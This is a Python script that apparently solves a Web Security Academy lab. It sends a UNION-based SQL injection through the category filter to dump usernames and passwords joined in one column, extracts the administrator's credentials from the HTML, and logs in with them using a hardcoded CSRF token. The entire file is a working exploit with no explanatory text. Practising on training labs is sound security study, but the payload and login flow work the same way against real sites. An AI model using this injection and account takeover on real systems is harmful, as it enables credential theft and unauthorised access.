import requests
from bs4 import BeautifulSoup
url = "https://0ac400f103d8641a80a51c5d00f900ac.web-security-academy.net"
header = {
    "Host": "0ac400f103d8641a80a51c5d00f900ac.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
sqli = "/filter?category='+UNION+SELECT+NULL,+username+||+'~'+||+password+FROM+users--"
response = requests.get(url=(url + sqli), headers=header)

soup = BeautifulSoup(response.text, "html.parser")
data = soup.find_all("tr")
adminInfo = dict()
for row in data:
    userData = row.find("th").text
    if ("administrator" in userData):
        info = userData.split("~")
        adminInfo["username"] = info[0]
        adminInfo["password"] = info[1]
        adminInfo["csrf"] = "Rp6VhFTB5797x5wR43EiYwOLXr7XNx1V"

print(adminInfo)
loginUrl = url + "/login"
loginRes = requests.post(url=loginUrl, headers=header, data=adminInfo)
